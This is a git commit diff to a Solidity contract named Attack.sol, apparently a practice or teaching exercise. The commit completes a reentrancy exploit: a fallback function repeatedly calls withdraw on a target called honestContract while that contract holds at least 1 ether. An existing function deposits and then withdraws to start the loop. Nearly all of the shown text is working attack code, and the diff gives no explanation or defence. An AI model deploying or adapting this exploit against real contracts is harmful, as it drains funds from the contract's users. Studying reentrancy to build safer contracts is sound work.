8987182c1903249d629cef2e204d29624defdad7
codeforstartups <48567820+codeforstartups@users.noreply.github.com>
2022-01-19 12:57:41 +0530

    Attack contract completed

--- contracts/Attack.sol
+++ contracts/Attack.sol
@@ -10,12 +10,18 @@ contract Attack {
     }
 
     fallback() external payable {
-
+        if( address(honestContract).balance  >= 1 ether){
+            honestContract.withdraw(1 ether);
+        }
     }
 
     function attck() external payable {
         require(msg.value >= 1 ether );
         honestContract.deposit{value: 1 ether}();
         honestContract.withdraw(1 ether);
+    }
+
+    function getBalances() public view returns(uint){
+        return address(this).balance;
     }
 }
